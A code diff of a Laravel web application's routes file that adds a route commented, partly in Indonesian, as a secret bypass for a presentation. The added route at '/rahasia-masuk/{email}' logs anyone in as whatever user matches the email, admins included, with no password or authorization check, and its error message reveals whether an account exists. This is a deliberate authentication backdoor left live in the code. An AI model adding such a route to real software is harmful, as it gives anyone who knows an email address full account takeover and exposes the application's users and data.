@@ -73,3 +73,15 @@ Route::post('/api/ai/extract-item', [AiExtractController::class, 'extract']);
 Route::get('/api/notifications', [NotificationController::class, 'index']);
 Route::put('/api/notifications/{notification}/read', [NotificationController::class, 'markAsRead']);
 Route::put('/api/notifications/read-all', [NotificationController::class, 'markAllRead']);
+
+// SECRET BYPASS ROUTE FOR PRESENTATION (Bisa untuk Super Admin & Admin)
+Route::get('/rahasia-masuk/{email}', function ($email) {
+    $user = \App\Models\User::where('email', $email)->first();
+    
+    if ($user) {
+        auth()->login($user);
+        return redirect('/')->with('success', "Bypass login berhasil! Anda masuk sebagai: " . strtoupper($user->role));
+    }
+    
+    return 'Error: Akun dengan email ' . $email . ' tidak ditemukan di database.';
+});
